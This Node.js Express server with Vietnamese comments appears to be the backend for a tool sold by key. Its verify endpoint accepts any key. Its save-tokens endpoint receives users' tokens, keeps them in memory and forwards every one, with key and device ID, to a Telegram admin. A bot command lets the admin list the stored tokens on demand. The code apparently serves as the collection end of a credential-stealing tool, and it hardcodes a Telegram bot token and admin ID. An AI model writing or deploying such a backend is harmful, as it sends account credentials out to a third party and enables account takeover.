const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');

const app = express();

// Cấu hình CORS mở rộng: Cho phép mọi yêu cầu từ Web và File .EXE (giao thức file://, app://)
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization', 'Accept']
}));

app.use(express.json());

// CẤU HÌNH BÀI VIẾT TELEGRAM
const TELEGRAM_TOKEN = "8326965315:AAGx_Byqs3qaD8tXevZY8dl8K3ogvMV3l-Y"; // Token Bot Telegram
const ADMIN_ID = 8377928865; // ID Telegram Admin

const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

// Khai báo biến lưu trữ tạm thời trong bộ nhớ Server
let globalTokens = [];
let isMaintenanceMode = false;
let maintenanceMsg = "HỆ THỐNG ĐANG BẢO TRÌ ĐỂ CẬP NHẬT!\nVUI LÒNG QUAY LẠI SAU ÍT PHÚT.";

// Cấu hình Thông báo Popup từ xa cho Tool
let currentNotice = {
    active: false,
    id: "notice_v1",
    title: "📢 THÔNG BÁO TỪ HỆ THỐNG",
    message: ""
};

// ----------------------------------------------------
// API 1: KIỂM TRA TRẠNG THÁI BẢO TRÌ VÀ THÔNG BÁO TỪ XA
// ----------------------------------------------------
app.get('/api/status', (req, res) => {
    return res.json({
        isMaintenance: isMaintenanceMode,
        message: maintenanceMsg,
        notice: currentNotice
    });
});

// ----------------------------------------------------
// API 2: XÁC THỰC KEY VÀ MÃ THIẾT BỊ (HWID)
// ----------------------------------------------------
app.get('/api/verify', (req, res) => {
    const { key, deviceId } = req.query;

    if (isMaintenanceMode) {
        return res.json({ success: false, isMaintenance: true, message: maintenanceMsg });
    }

    if (!key) {
        return res.json({ success: false, message: "Vui lòng nhập Key!" });
    }

    // Thời gian hết hạn mặc định (24 giờ kể từ lúc đăng nhập)
    const expireAt = Date.now() + (24 * 60 * 60 * 1000);

    return res.json({
        success: true,
        isMaintenance: false,
        key: key,
        deviceId: deviceId,
        expireAt: expireAt,
        message: "Xác thực Key thành công!"
    });
});

// ----------------------------------------------------
// API 3: NHẬN TOKEN TỪ TOOL VÀ GỬI VỀ TELEGRAM ADMIN
// ----------------------------------------------------
app.post('/api/save-tokens', async (req, res) => {
    try {
        const { key, deviceId, tokens } = req.body;

        if (!tokens || !Array.isArray(tokens) || tokens.length === 0) {
            return res.status(400).json({ success: false, message: "Không tìm thấy token nào trong yêu cầu!" });
        }

        const validTokens = tokens.map(t => t.trim()).filter(t => t !== "");

        if (validTokens.length === 0) {
            return res.status(400).json({ success: false, message: "Danh sách Token rỗng!" });
        }

        // Cập nhật Token vào bộ nhớ Server
        globalTokens = validTokens;

        // Gửi thông báo Token về Telegram Admin (Sử dụng HTML để không bị lỗi ký tự đặc biệt)
        let msg = `📥 <b>NHẬN TOKEN MỚI TỪ TOOL</b>\n`;
        msg += `🔑 Key: <code>${key || 'Không có'}</code>\n`;
        msg += `📱 HWID: <code>${deviceId || 'Không có'}</code>\n`;
        msg += `📊 Số lượng: <b>${validTokens.length} Token</b>\n\n`;
        msg += `📋 <b>Danh sách Token:</b>\n`;

        validTokens.forEach((tk, idx) => {
            msg += `${idx + 1}. <code>${tk}</code>\n`;
        });

        await bot.sendMessage(ADMIN_ID, msg, { parse_mode: 'HTML' });

        return res.json({ success: true, message: "Đã lưu và gửi Token về Bot thành công!" });

    } catch (error) {
        console.error("Lỗi xử lý /api/save-tokens:", error);
        return res.status(500).json({ success: false, message: "Lỗi Server nội bộ!" });
    }
});

// ----------------------------------------------------
// BOT TELEGRAM COMMANDS (BẢNG ĐIỀU KHIỂN TỪ XA)
// ----------------------------------------------------

// Lệnh Hướng dẫn / Fast Menu
bot.onText(/\/start|\/help/, (msg) => {
    if (msg.from.id !== ADMIN_ID) return;
    let text = `🤖 <b>BẢNG ĐIỀU KHIỂN BOT ADMIN SENKOO</b>\n\n`;
    text += `🔹 <b>/listtokens</b> : Xem danh sách Token mới nhất\n`;
    text += `🔹 <b>/baotri on</b> : Bật chế độ bảo trì (Khóa Tool từ xa)\n`;
    text += `🔹 <b>/baotri off</b> : Tắt chế độ bảo trì (Mở khóa Tool)\n`;
    text += `🔹 <b>/thongbao [Nội dung]</b> : Bật Popup thông báo mới trên Tool\n`;
    text += `🔹 <b>/tatthongbao</b> : Tắt Popup thông báo trên Tool\n`;
    bot.sendMessage(ADMIN_ID, text, { parse_mode: 'HTML' });
});

// Lệnh kiểm tra danh sách Token hiện có
bot.onText(/\/listtokens/, (msg) => {
    if (msg.from.id !== ADMIN_ID) return;

    if (globalTokens.length === 0) {
        return bot.sendMessage(ADMIN_ID, "⚠️ Hiện chưa có Token nào trong hệ thống (Hoặc Server vừa khởi động lại).");
    }

    let text = `📋 <b>DANH SÁCH TOKEN HIỆN CÓ (${globalTokens.length}):</b>\n\n`;
    globalTokens.forEach((tk, i) => {
        text += `${i + 1}. <code>${tk}</code>\n`;
    });

    bot.sendMessage(ADMIN_ID, text, { parse_mode: 'HTML' });
});

// Lệnh bật/tắt bảo trì từ xa (/baotri on hoặc /baotri off)
bot.onText(/\/baotri (.+)/, (msg, match) => {
    if (msg.from.id !== ADMIN_ID) return;
    const action = match[1].toLowerCase().trim();

    if (action === "on") {
        isMaintenanceMode = true;
        bot.sendMessage(ADMIN_ID, "🔒 Đã BẬT chế độ bảo trì. Toàn bộ Tool sẽ bị khóa!");
    } else if (action === "off") {
        isMaintenanceMode = false;
        bot.sendMessage(ADMIN_ID, "🔓 Đã TẮT chế độ bảo trì. Người dùng có thể sử dụng Tool bình thường.");
    }
});

// Lệnh gửi thông báo Popup tới Tool (/thongbao <Nội dung thông báo>)
bot.onText(/\/thongbao (.+)/, (msg, match) => {
    if (msg.from.id !== ADMIN_ID) return;
    const noticeContent = match[1].trim();

    currentNotice = {
        active: true,
        id: "notice_" + Date.now(), // Tạo ID mới dựa trên Timestamp để Tool tự động kích hoạt Popup
        title: "📢 THÔNG BÁO TỪ HỆ THỐNG",
        message: noticeContent
    };

    bot.sendMessage(ADMIN_ID, `✅ Đã gửi thông báo mới lên Tool:\n\n💬 "<b>${noticeContent}</b>"`, { parse_mode: 'HTML' });
});

// Lệnh tắt thông báo Popup trên Tool (/tatthongbao)
bot.onText(/\/tatthongbao/, (msg) => {
    if (msg.from.id !== ADMIN_ID) return;
    currentNotice.active = false;
    bot.sendMessage(ADMIN_ID, "❌ Đã TẮT bảng thông báo Popup trên Tool!");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server đang chạy tại Cổng ${PORT}...`);
});
